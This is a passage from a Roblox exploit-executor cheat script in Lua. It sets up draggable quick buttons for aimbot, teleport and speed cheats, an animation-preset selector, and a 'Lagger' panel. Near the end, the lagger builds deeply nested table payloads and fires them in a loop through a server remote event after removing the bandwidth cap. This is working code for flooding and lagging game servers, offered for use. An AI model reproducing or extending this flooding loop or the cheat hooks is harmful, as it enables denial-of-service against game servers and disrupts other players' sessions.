	local function quickButtonsAreLocked()
	return toggleStates["Lock Buttons"] == true
	end
	local function updateQuickButtonPosition(input)
	if not draggingQuickButton or not quickDragStart or not quickDragPosition then return end
	local delta = input.Position - quickDragStart
	if delta.Magnitude > 6 then
	quickDragMoved = true
	end
	local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(0, 0)
	local size = draggingQuickButton.AbsoluteSize
	local x = math.clamp(quickDragPosition.X.Offset + delta.X, 0, math.max(0, viewport.X - size.X))
	local y = math.clamp(quickDragPosition.Y.Offset + delta.Y, 0, math.max(0, viewport.Y - size.Y))
	draggingQuickButton.Position = UDim2.new(0, x, 0, y)
	end
	for _, button in ipairs(movableButtons) do
	button.InputBegan:Connect(function(input)
	if quickButtonsAreLocked() then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	draggingQuickButton = button
	quickDragStart = input.Position
	quickDragPosition = button.Position
	quickDragInput = input
	quickDragMoved = false
	end
	end)
	end
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(input)
	if not draggingQuickButton or quickButtonsAreLocked() then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input == quickDragInput then
	updateQuickButtonPosition(input)
	end
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(input)
	local isMouseRelease = quickDragInput and quickDragInput.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseButton1
	if draggingQuickButton and (input == quickDragInput or isMouseRelease) then
	local movedButton = draggingQuickButton
	draggingQuickButton = nil
	quickDragStart = nil
	quickDragPosition = nil
	quickDragInput = nil
	if quickDragMoved then
	quickButtonPositions[movedButton.Name] = {
	x = movedButton.Position.X.Offset,
	y = movedButton.Position.Y.Offset,
	}
	saveConfig()
	quickTapBlocked[movedButton] = true
	task.delay(0.2, function()
	quickTapBlocked[movedButton] = nil
	end)
	end
	end
	end))

	local function connectQuickButton(button, callback)
	button.Activated:Connect(function()
	if quickTapBlocked[button] then
	quickTapBlocked[button] = nil
	return
	end
	callback()
	end)
	end
	connectQuickButton(aimbotButton, function() toggleQuickFeature("Aimbot") end)
	connectQuickButton(autoBatButton, function()
	if _G.CandyVSAutoBat and _G.CandyVSAutoBat.Toggle then
	pcall(_G.CandyVSAutoBat.Toggle)
	else
	toggleQuickFeature("TP Bat")
	end
	end)
	connectQuickButton(tpDownButton, function()
	if FeatureToggles["TP Down"] then pcall(FeatureToggles["TP Down"]) end
	end)
	connectQuickButton(dropButton, function()
	if FeatureToggles["Drop"] then pcall(FeatureToggles["Drop"], "button") end
	end)
	connectQuickButton(carrySpeedButton, function()
	if carrySpeedMode == "v2" then
	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled
	toggleStates["Speed Boost"] = true
	if _G.__refreshSpeedBoost then pcall(_G.__refreshSpeedBoost) end
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	elseif FeatureToggles["Carry Speed"] then
	pcall(FeatureToggles["Carry Speed"])
	else
	toggleQuickFeature("Carry Speed")
	end
	end)
	connectQuickButton(speedModeButton, function()
	if selectedMode == "Lagger" then
	if FeatureToggles["SelectNormalMode"] then pcall(FeatureToggles["SelectNormalMode"]) end
	else
	if FeatureToggles["SelectLaggerMode"] then pcall(FeatureToggles["SelectLaggerMode"]) end
	end
	end)
	connectQuickButton(autoplayButton, function()
	if FeatureToggles["Autoplay"] then
	pcall(FeatureToggles["Autoplay"])
	end
	end)
	connectQuickButton(quickTapBlocked.custom.button, function()
	local customSpeed = quickTapBlocked.custom.getSelected()
	if customSpeed and selectedMode ~= customSpeed.name then
	selectMode(customSpeed.name)
	end
	end)
	local quickUpdateAccumulator = 0
	local quickLast = {}
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	quickUpdateAccumulator = quickUpdateAccumulator + (dt or 0)
	if quickUpdateAccumulator < 0.40 then return end
	quickUpdateAccumulator = 0
	local showButtons = toggleStates["Show Buttons"] == true
	if quickLast.show ~= showButtons then quickButtons.Visible = showButtons; quickLast.show = showButtons end
	if not showButtons then return end
	local aimbotActive = toggleStates["Aimbot"] == true
	local autoBatActive = toggleStates["TP Bat"] == true
	local carryActive = toggleStates["Carry Speed"] == true
	local autoplayIsActive = toggleStates["Autoplay"] == true
	local activeCustomSpeed = quickTapBlocked.custom.getByName(selectedMode)
	local quickCustomSpeed = activeCustomSpeed or quickTapBlocked.custom.getSelected()
	if quickLast.carryVisible ~= true then carrySpeedButton.Visible = true; quickLast.carryVisible = true end
	if quickLast.aimbot ~= aimbotActive then setQuickVisual(aimbotButton, aimbotStroke, aimbotActive); quickLast.aimbot = aimbotActive end
	if quickLast.autoBat ~= autoBatActive then setQuickVisual(autoBatButton, autoBatStroke, autoBatActive); quickLast.autoBat = autoBatActive end
	if quickLast.carry ~= carryActive then setQuickVisual(carrySpeedButton, carrySpeedStroke, carryActive); quickLast.carry = carryActive end
	if quickLast.autoplay ~= autoplayIsActive then setQuickVisual(autoplayButton, autoplayStroke, autoplayIsActive); quickLast.autoplay = autoplayIsActive end
	local customSpeedName = quickCustomSpeed and quickCustomSpeed.name or nil
	if quickLast.customName ~= customSpeedName or quickLast.customActive ~= (activeCustomSpeed ~= nil) then
	quickTapBlocked.custom.button.Text = customSpeedName and ("CUSTOM\n" .. string.upper(customSpeedName)) or "NO CUSTOM"
	setQuickVisual(quickTapBlocked.custom.button, quickTapBlocked.custom.stroke, activeCustomSpeed ~= nil)
	quickLast.customName = customSpeedName
	quickLast.customActive = activeCustomSpeed ~= nil
	end
	local isLaggerSpeed = selectedMode == "Lagger"
	if quickLast.lagger ~= isLaggerSpeed then
	speedModeButton.Text = isLaggerSpeed and "NORMAL SPEED" or "LAGGER SPEED"
	setQuickVisual(speedModeButton, speedModeStroke, isLaggerSpeed)
	quickLast.lagger = isLaggerSpeed
	end
	if quickLast.actionsInitialized ~= true then
	setQuickVisual(tpDownButton, tpDownStroke, false)
	setQuickVisual(dropButton, dropStroke, false)
	quickLast.actionsInitialized = true
	end
	end)))
	end

	do
	local panelsSection = makeUraniumSection(tabPages.Visuals, "PANELS")
	local panelsPanel = Instance.new("Frame", panelsSection)
	panelsPanel.Size = UDim2.new(1, -10, 0, 104)
	panelsPanel.Position = UDim2.new(0, 5, 0, 28)
	panelsPanel.BackgroundColor3 = Color3.fromRGB(20, 22, 31)
	panelsPanel.BackgroundTransparency = 0.12
	panelsPanel.BorderSizePixel = 0
	Instance.new("UICorner", panelsPanel).CornerRadius = UDim.new(0, 8)
	local panelsPanelStroke = Instance.new("UIStroke", panelsPanel)
	panelsPanelStroke.Color = Color3.fromRGB(0, 0, 0)
	panelsPanelStroke.Thickness = 1.2
	panelsPanelStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	panelsPanelStroke.Transparency = 0.15

	local row = Instance.new("Frame", panelsPanel)
	row.Size = UDim2.new(1, -18, 0, 30)
	row.Position = UDim2.new(0, 9, 0, 10)
	row.BackgroundTransparency = 1
	local bypassBtn = Instance.new("TextButton", row)
	bypassBtn.Size = UDim2.new(0.5, -4, 1, 0)
	bypassBtn.Position = UDim2.new(0, 0, 0, 0)
	bypassBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	bypassBtn.BackgroundTransparency = 0.15
	bypassBtn.BorderSizePixel = 0
	bypassBtn.Text = "BYPASS"
	bypassBtn.TextColor3 = Color3.fromRGB(50, 110, 190)
	bypassBtn.TextSize = 11
	bypassBtn.Font = Enum.Font.FredokaOne
	bypassBtn.AutoButtonColor = false
	Instance.new("UICorner", bypassBtn).CornerRadius = UDim.new(0, 6)
	local bypassStroke = Instance.new("UIStroke", bypassBtn)
	bypassStroke.Color = Color3.fromRGB(0, 0, 0)
	bypassStroke.Thickness = 1
	bypassStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local laggerBtn = Instance.new("TextButton", row)
	laggerBtn.Size = UDim2.new(0.5, -4, 1, 0)
	laggerBtn.Position = UDim2.new(0.5, 4, 0, 0)
	laggerBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	laggerBtn.BackgroundTransparency = 0.15
	laggerBtn.BorderSizePixel = 0
	laggerBtn.Text = "LAGGER"
	laggerBtn.TextColor3 = Color3.fromRGB(50, 110, 190)
	laggerBtn.TextSize = 11
	laggerBtn.Font = Enum.Font.FredokaOne
	laggerBtn.AutoButtonColor = false
	Instance.new("UICorner", laggerBtn).CornerRadius = UDim.new(0, 6)
	local laggerStroke = Instance.new("UIStroke", laggerBtn)
	laggerStroke.Color = Color3.fromRGB(0, 0, 0)
	laggerStroke.Thickness = 1
	laggerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local laggerToggled = false

	local function updateLaggerVisual()
	laggerBtn.BackgroundColor3 = laggerToggled and Color3.fromRGB(80, 160, 255) or Color3.fromRGB(30, 30, 38)
	laggerBtn.TextColor3 = laggerToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(50, 110, 190)
		laggerStroke.Color = laggerToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
	laggerStroke.Thickness = laggerToggled and 1.5 or 1
	end

	(function()
	local animationPresets = {
	["Cartoon"] = { RunAnim=742638842, WalkAnim=742640026, JumpAnim=742637942, FallAnim=742637151, Swim=742639220, SwimIdle=742639812, ClimbAnim=742636889, Idle={742637544,742638445,885477856} },
	["Adidas Community"] = { WalkAnim=122150855457006, RunAnim=82598234841035, JumpAnim=75290611992385, FallAnim=98600215928904, SwimIdle=109346520324160, Swim=133308483266208, Animation1=122257458498464, Animation2=102357151005774, ClimbAnim=88763136693023 },
	["Adidas Aura"] = { WalkAnim=83842218823011, RunAnim=118320322718866, JumpAnim=109996626521204, FallAnim=95603166884636, SwimIdle=94922130551805, Swim=134530128383903, Animation1=110211186840347, Animation2=114191137265065, ClimbAnim=97824616490448 },
	["Zombie"] = { WalkAnim=10921355261, RunAnim=616163682, JumpAnim=10921351278, FallAnim=10921350320, SwimIdle=10921353442, Swim=10921352344, Animation1=10921344533, Animation2=10921345304, ClimbAnim=10921343576 },
	["Catwalk Glam"] = { WalkAnim=109168724482748, RunAnim=81024476153754, JumpAnim=116936326516985, FallAnim=92294537340807, SwimIdle=98854111361360, Swim=134591743181628, ClimbAnim=119377220967554, Animation1=133806214992291, Animation2=94970088341563 },
	["Toy"] = { WalkAnim=10921312010, RunAnim=10921306285, JumpAnim=10921308158, FallAnim=10921307241, SwimIdle=10921310341, Swim=10921309319, ClimbAnim=10921300839, Animation1=10921301576 },
	["Amazon Unboxed"] = { WalkAnim=90478085024465, RunAnim=134824450619865, JumpAnim=121454505477205, FallAnim=94788218468396, SwimIdle=129126268464847, Swim=105962919001086, ClimbAnim=121145883950231, Animation1=98281136301627 },
	["Vampire"] = { WalkAnim=10921326949, RunAnim=10921320299, JumpAnim=10921322186, FallAnim=10921321317, SwimIdle=10921325443, Swim=10921324408, ClimbAnim=10921314188, Animation1=10921315373 },
	["Ninja"] = { RunAnim=656118852, WalkAnim=656121766, JumpAnim=656117878, FallAnim=656115606, Swim=656119721, SwimIdle=656121397, ClimbAnim=656114359, Idle={656117400,656118341,886742569} },
	}

	local animationPresetOrder = {
	"Cartoon",
	"Adidas Community",
	"Adidas Aura",
	"Zombie",
	"Catwalk Glam",
	"Toy",
	"Amazon Unboxed",
	"Vampire",
	"Ninja",
	}

	local currentPresetIndex = 1
	local currentPresetName = animationPresetOrder[1]

	local function normalizeAnimValue(value)
	if not value then return nil end
	if type(value) == "number" then return "rbxassetid://" .. tostring(value) end
	if type(value) == "string" then
	if string.sub(value, 1, 11) == "rbxassetid://" then return value end
	if string.match(value, "^%d+$") then return "rbxassetid://" .. value end
	return value
	end
	return nil
	end

	local function buildAnimPackFromPreset(preset)
	local idle = preset and preset.Idle
	return {
	idle1 = normalizeAnimValue(preset and (preset.Animation1 or (idle and idle[1]))),
	idle2 = normalizeAnimValue(preset and (preset.Animation2 or (idle and idle[2]))),
	walk = normalizeAnimValue(preset and (preset.WalkAnim or preset.Walk)),
	run = normalizeAnimValue(preset and (preset.RunAnim or preset.Run)),
	jump = normalizeAnimValue(preset and (preset.JumpAnim or preset.Jump)),
	fall = normalizeAnimValue(preset and (preset.FallAnim or preset.Fall)),
	climb = normalizeAnimValue(preset and (preset.ClimbAnim or preset.Climb)),
	swim = normalizeAnimValue(preset and (preset.Swim or preset.SwimAnim)),
	swimidle = normalizeAnimValue(preset and (preset.SwimIdle or preset.SwimIdleAnim)),
	}
	end

	local function applyAnimationsToCharacter(char, animPack)
	if not char or not animPack then return false end
	local animate = char:FindFirstChild("Animate")
	if not animate then
	animate = Instance.new("Animation")
	animate.Name = "Animate"
	animate.Parent = char
	end

	_G.__ZurichHub_OriginalAnims = _G.__ZurichHub_OriginalAnims or {}
	local playerKey = tostring(Player.UserId or "local")
	if not _G.__ZurichHub_OriginalAnims[playerKey] then
	local originals = {}
	for _, containerName in ipairs({"idle","walk","run","jump","fall","climb","swim","swimidle"}) do
	local cont = animate:FindFirstChild(containerName)
	if cont then
	for _, child in ipairs(cont:GetChildren()) do
	pcall(function()
	originals[containerName .. "." .. child.Name] = child.AnimationId
	end)
	end
	end
	end
	_G.__ZurichHub_OriginalAnims[playerKey] = originals
	end

	local function ensureAnim(parent, name)
	local obj = parent:FindFirstChild(name)
	if not obj then
	obj = Instance.new("Animation")
	obj.Name = name
	obj.Parent = parent
	end
	return obj
	end

	local function setAnim(container, animName, id)
	if not id then return end
	local animObj = container:FindFirstChild(animName)
	if not animObj then
	animObj = Instance.new("Animation")
	animObj.Name = animName
	animObj.Parent = container
	end
	animObj.AnimationId = id
	end

	local idle = ensureAnim(animate, "idle")
	local walk = ensureAnim(animate, "walk")
	local run = ensureAnim(animate, "run")
	local jump = ensureAnim(animate, "jump")
	local fall = ensureAnim(animate, "fall")
	local climb = ensureAnim(animate, "climb")
	local swim = ensureAnim(animate, "swim")
	local swimidle = ensureAnim(animate, "swimidle")

	setAnim(idle, "Animation1", animPack.idle1)
	setAnim(idle, "Animation2", animPack.idle2)
	setAnim(walk, "WalkAnim", animPack.walk)
	setAnim(run, "RunAnim", animPack.run)
	setAnim(jump, "JumpAnim", animPack.jump)
	setAnim(fall, "FallAnim", animPack.fall)
	setAnim(climb, "ClimbAnim", animPack.climb)
	setAnim(swim, "Swim", animPack.swim)
	setAnim(swimidle, "SwimIdle", animPack.swimidle)

	_G.__ZurichHub_Anims = _G.__ZurichHub_Anims or {}
	for key, value in pairs(animPack) do
	if value then _G.__ZurichHub_Anims[key] = value end
	end

	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
	for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
	pcall(function() track:Stop(0) end)
	end
	end

	return true
	end

	local function restoreOriginalAnims(char)
	if not char then return false end
	local playerKey = tostring(Player.UserId or "local")
	local saved = _G.__ZurichHub_OriginalAnims and _G.__ZurichHub_OriginalAnims[playerKey]
	if not saved then return false end
	local animate = char:FindFirstChild("Animate")
	if not animate then return false end
	for key, animId in pairs(saved) do
	local sep = string.find(key, "%.")
	if sep then
	local containerName = string.sub(key, 1, sep - 1)
	local childName = string.sub(key, sep + 1)
	local cont = animate:FindFirstChild(containerName)
	if not cont then
	cont = Instance.new("Animation")
	cont.Name = containerName
	cont.Parent = animate
	end
	local child = cont:FindFirstChild(childName)
	if not child then
	child = Instance.new("Animation")
	child.Name = childName
	child.Parent = cont
	end
	pcall(function() child.AnimationId = animId end)
	end
	end
	return true
	end

	local function applyAnimationPreset(presetName)
	local preset = animationPresets[presetName]
	if not preset then return false end
	local animPack = buildAnimPackFromPreset(preset)
	local char = Player.Character
	if char then
	return applyAnimationsToCharacter(char, animPack)
	else
	currentPresetName = presetName
	_G.__pendingAnimationPreset = presetName
	return true
	end
	end

	local CONFIG_FILE = "AnimationSelector_Config.txt"
	local animsEnabled = false

	local function saveAnimConfig()
	local currPreset = currentPresetName or animationPresetOrder[currentPresetIndex] or "Cartoon"
	local data = { presetIndex = currentPresetIndex, presetName = currPreset, enabled = animsEnabled }
	local ok, json = pcall(function() return HttpService:JSONEncode(data) end)
	if ok then pcall(function() writefile(CONFIG_FILE, json) end) end
	end

	local function loadAnimConfig()
	local ok, hasFile = pcall(function() return isfile(CONFIG_FILE) end)
	if not ok or not hasFile then return false end
	local ok2, json = pcall(function() return readfile(CONFIG_FILE) end)
	if not ok2 or not json or json == "" then return false end
	local ok3, data = pcall(function() return HttpService:JSONDecode(json) end)
	if not ok3 or not data then return false end

	if data.presetName and animationPresets[data.presetName] then
	currentPresetName = data.presetName
	for i, presetName in ipairs(animationPresetOrder) do
	if presetName == data.presetName then
	currentPresetIndex = i
	break
	end
	end
	elseif data.presetIndex and data.presetIndex >= 1 and data.presetIndex <= #animationPresetOrder then
	currentPresetIndex = data.presetIndex
	currentPresetName = animationPresetOrder[currentPresetIndex]
	end

	if currentPresetName == nil then
	currentPresetName = animationPresetOrder[currentPresetIndex or 1]
	end

	animsEnabled = false
	return true
	end

	pcall(loadAnimConfig)
	if animsEnabled and currentPresetName and animationPresets[currentPresetName] then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end
	if animsEnabled and currentPresetName and Player.Character then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	local animSection = makeUraniumSection(tabPages.Visuals, "ANIMATION PACK")
	do
	local parentSection = animSection and animSection.Parent
	if parentSection then
	for _, child in ipairs(parentSection:GetChildren()) do
	if child:IsA("Frame") then
	local lab = child:FindFirstChildOfClass("TextLabel")
	if lab and lab.Text == string.upper("ANIMATION PACK") then
	for _, f in ipairs(child:GetChildren()) do
	if f:IsA("Frame") and f.Size and f.Size.Y and f.Size.Y.Offset == 1 then
	f:Destroy()
	break
	end
	end
	break
	end
	end
	end
	end
	end
	local sectionFrame = animSection 
	local container = Instance.new("Frame", sectionFrame)
	container.Size = UDim2.new(1, -10, 0, 68)
	container.Position = UDim2.new(0, 5, 0, 30)
	container.BackgroundColor3 = Color3.fromRGB(20, 22, 31)
	container.BackgroundTransparency = 0.12
	container.BorderSizePixel = 0
	container.Parent = animSection
	Instance.new("UICorner", container).CornerRadius = UDim.new(0,8)
	local containerStroke = Instance.new("UIStroke", container)
	containerStroke.Color = Color3.fromRGB(0, 0, 0)
	containerStroke.Thickness = 1.2
	containerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	containerStroke.Transparency = 0.15

	local animTogglePanel = Instance.new("Frame", container)
	animTogglePanel.Size = UDim2.new(0, 72, 1, -10)
	animTogglePanel.Position = UDim2.new(0, 6, 0, 5)
	animTogglePanel.BackgroundColor3 = Color3.fromRGB(32, 35, 42)
	animTogglePanel.BackgroundTransparency = 0.08
	animTogglePanel.BorderSizePixel = 0
	Instance.new("UICorner", animTogglePanel).CornerRadius = UDim.new(0, 7)

	pcall(loadAnimConfig)
	if animsEnabled and currentPresetName and animationPresets[currentPresetName] then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	local animToggleBtn = Instance.new("TextButton", animTogglePanel)
	animToggleBtn.Size = UDim2.new(1, -8, 1, -8)
	animToggleBtn.Position = UDim2.new(0, 4, 0, 4)
	animToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 55, 64)
	animToggleBtn.BorderSizePixel = 0
	animToggleBtn.Text = "OFF"
	animToggleBtn.TextColor3 = Color3.fromRGB(245, 247, 250)
	animToggleBtn.TextSize = 10
	animToggleBtn.Font = Enum.Font.FredokaOne
	animToggleBtn.AutoButtonColor = false
	animToggleBtn.TextWrapped = false
	animToggleBtn.ZIndex = 6
	Instance.new("UICorner", animToggleBtn).CornerRadius = UDim.new(0, 5)
	pcall(function(parent)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255, 255, 255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, animToggleBtn)

	local function updateAnimToggleVisual()
	animToggleBtn.Text = animsEnabled and "ON" or "OFF"
	animToggleBtn.BackgroundColor3 = animsEnabled and Color3.fromRGB(82, 140, 220) or Color3.fromRGB(52, 58, 68)
	animToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	animToggleBtn.Font = Enum.Font.FredokaOne
	end

	animToggleBtn.Activated:Connect(function()
	animsEnabled = not animsEnabled
	updateAnimToggleVisual()
	if animsEnabled then
	applyAnimationPreset(currentPresetName)
	elseif Player.Character then
	restoreOriginalAnims(Player.Character)
	end
	saveAnimConfig()
	end)

	local leftBtn = Instance.new("TextButton")
	leftBtn.Size = UDim2.new(0, 32, 0, 32)
	leftBtn.Position = UDim2.new(0, 88, 0.5, -16)
	leftBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	leftBtn.BackgroundTransparency = 0.15
	leftBtn.BorderSizePixel = 0
	leftBtn.Text = "◄"
	leftBtn.TextColor3 = Color3.fromRGB(240,245,255)
	leftBtn.TextSize = 20
	leftBtn.Font = Enum.Font.FredokaOne
	leftBtn.AutoButtonColor = false
	leftBtn.ZIndex = 5
	leftBtn.Parent = container
	pcall(function(parent)
	local corner = Instance.new("UICorner", parent)
	corner.CornerRadius = UDim.new(0,5)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, leftBtn)

	local selectorFrame = Instance.new("Frame")
	selectorFrame.Name = "AnimationPackSelector"
	selectorFrame.Size = UDim2.new(1, -122, 0, 30)
	selectorFrame.Position = UDim2.new(0, 108, 0, 19)
	selectorFrame.BackgroundTransparency = 1
	selectorFrame.Parent = container

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -36, 1, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = tostring(currentPresetName or "")
	titleLabel.TextColor3 = Color3.fromRGB(240, 245, 255)
	titleLabel.TextSize = 12
	titleLabel.Font = Enum.Font.FredokaOne
	titleLabel.TextXAlignment = Enum.TextXAlignment.Center
	titleLabel.TextYAlignment = Enum.TextYAlignment.Center
	titleLabel.ZIndex = 5
	titleLabel.Parent = selectorFrame
	titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	titleLabel.Position = UDim2.new(0.5, 0, 0.5, 4)
	pcall(function(parent)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Transparency = 1
	end, titleLabel)

	local rightBtn = Instance.new("TextButton")
	rightBtn.Size = UDim2.new(0, 32, 0, 32)
	rightBtn.Position = UDim2.new(1, -32, 0.5, -16)
	rightBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	rightBtn.BackgroundTransparency = 0.15
	rightBtn.BorderSizePixel = 0
	rightBtn.Text = "►"
	rightBtn.TextColor3 = Color3.fromRGB(240,245,255)
	rightBtn.TextSize = 20
	rightBtn.Font = Enum.Font.FredokaOne
	rightBtn.AutoButtonColor = false
	rightBtn.ZIndex = 5
	rightBtn.Parent = selectorFrame
	pcall(function(parent)
	local corner = Instance.new("UICorner", parent)
	corner.CornerRadius = UDim.new(0,5)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, rightBtn)

	local function updateTitle(t, direction)
	direction = direction or "next"
	titleLabel.Text = tostring(t or "")
	titleLabel.TextTransparency = 1
	titleLabel.Position = UDim2.new(0.5, direction == "next" and -90 or 90, 0.5, 0)
	TweenService:Create(titleLabel, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Position = UDim2.new(0.5, 0, 0.5, 0),
	TextTransparency = 0,
	}):Play()
	end

	local function changePreset(direction)
	local newIdx = currentPresetIndex + (direction == "next" and 1 or -1)
	if newIdx < 1 then newIdx = #animationPresetOrder end
	if newIdx > #animationPresetOrder then newIdx = 1 end
	currentPresetIndex = newIdx
	currentPresetName = animationPresetOrder[currentPresetIndex]
	updateTitle(currentPresetName, direction)
	if animsEnabled then
	applyAnimationPreset(currentPresetName)
	else
	if Player.Character then
	restoreOriginalAnims(Player.Character)
	end
	end
	saveAnimConfig()
	local btn = (direction == "next") and rightBtn or leftBtn
	TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(0,80,180)}):Play()
	task.delay(0.08, function() TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(30,30,38)}):Play() end)
	end

	leftBtn.MouseButton1Click:Connect(function() changePreset("prev") end)
	rightBtn.MouseButton1Click:Connect(function() changePreset("next") end)

	leftBtn.Parent = selectorFrame
	rightBtn.Parent = selectorFrame
	titleLabel.Parent = selectorFrame
	updateAnimToggleVisual()
	if animsEnabled and currentPresetName then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	leftBtn.Position = UDim2.new(0, -8, 0.5, -12)
	rightBtn.Position = UDim2.new(1, -24, 0.5, -12)

	leftBtn.MouseEnter:Connect(function()
	TweenService:Create(leftBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0, TextColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	leftBtn.MouseLeave:Connect(function()
	TweenService:Create(leftBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0.15, TextColor3 = Color3.fromRGB(240,245,255)}):Play()
	end)
	rightBtn.MouseEnter:Connect(function()
	TweenService:Create(rightBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0, TextColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	rightBtn.MouseLeave:Connect(function()
	TweenService:Create(rightBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0.15, TextColor3 = Color3.fromRGB(240,245,255)}):Play()
	end)

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if animsEnabled then
	local animPack = buildAnimPackFromPreset(animationPresets[currentPresetName])
	applyAnimationsToCharacter(char, animPack)
	end
	end))

	task.spawn(function()
	task.wait(0.5)
	if Player.Character and animsEnabled then
	local animPack = buildAnimPackFromPreset(animationPresets[currentPresetName])
	applyAnimationsToCharacter(Player.Character, animPack)
	end
	end)
	end)()

	_G.__CandyVSReadSavedPanelVisibility = function(settingsFile)
	if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then return false, false end
	local ok, data = pcall(function()
	if not isfile(settingsFile) then return nil end
	return HttpService:JSONDecode(readfile(settingsFile))
	end)
	if not ok or type(data) ~= "table" then return false, false end
	return true, data.visible == true
	end

	local function openLaggerGUI(openPanel)
	if openPanel == nil then openPanel = true end
	if openPanel and _G.CandyVSBypass and _G.CandyVSBypass.SetVisible then
	pcall(_G.CandyVSBypass.SetVisible, false)
	end
	local player = game:GetService("Players").LocalPlayer
	local playerGui = player and player:FindFirstChild("PlayerGui")
	if playerGui and playerGui:FindFirstChild("CandyVSLaggerGUI") then
	local gui = playerGui:FindFirstChild("CandyVSLaggerGUI")
	if gui and openPanel then
	gui.Visible = true
	end
	if _G.CandyVSLagger and _G.CandyVSLagger.SetVisible then
	_G.CandyVSLagger.SetVisible(openPanel)
	end
	return
	end
	if _G._CandyVSLaggerGUILoaded then
	_G._CandyVSLaggerGUILoaded = false
	end
	_G._CandyVSLaggerGUILoaded = true
	_G.__openLaggerGUI = openLaggerGUI

	task.spawn(function()
	pcall(function()
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")

	local previousGui = playerGui:FindFirstChild("CandyVSLaggerGUI")
	if previousGui then previousGui:Destroy() end

	local LAGGER_CONFIG = {
	TableIncrease = 270,
	Tries = 1,
	LoopWaitTime = 0.3,
	LowEndTableIncrease = 265,
	LowEndLoopWaitTime = 0.8,
	}
	local LAGGER_POWER_MAX = 290

	local laggerStates = { Main = false, LowEnd = false }
	local lagThreads = { Main = nil, LowEnd = nil }
	local cachedBombAmount, cachedBombPayload = nil, nil

	local function buildBombPayload(amt)
	local main, spam = {}, {{}}
	local z = spam[1]
	for _ = 1, amt do
	local t = {}
	table.insert(z, t)
	z = t
	end
	local max = math.min(499999 / (amt + 2), 1500)
	for _ = 1, max do
	table.insert(main, spam)
	end
	return main
	end

	local function bomb(amt)
	if cachedBombAmount ~= amt or not cachedBombPayload then
		cachedBombAmount = amt
		cachedBombPayload = buildBombPayload(amt)
	end
	pcall(function()
	game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBombPayload)
	end)
	end

	local function startMainLag()
	if lagThreads.Main then return end
	lagThreads.Main = task.spawn(function()
	while laggerStates.Main do
	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
	end)
	bomb(LAGGER_CONFIG.TableIncrease)
	task.wait(LAGGER_CONFIG.LoopWaitTime)
	end
	end)
	end

	local function startLowEndLag()
	if lagThreads.LowEnd then return end
	lagThreads.LowEnd = task.spawn(function()
	while laggerStates.LowEnd do
	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(25000)
	end)
	bomb(LAGGER_CONFIG.LowEndTableIncrease)
	task.wait(LAGGER_CONFIG.LowEndLoopWaitTime)
	end
	end)
	end

	local function stopThread(type)
	if lagThreads[type] then
	task.cancel(lagThreads[type])
	lagThreads[type] = nil
	end
	end

	local function stopAllLaggerThreads()
	laggerStates.Main = false
	laggerStates.LowEnd = false
	stopThread("Main")
	stopThread("LowEnd")
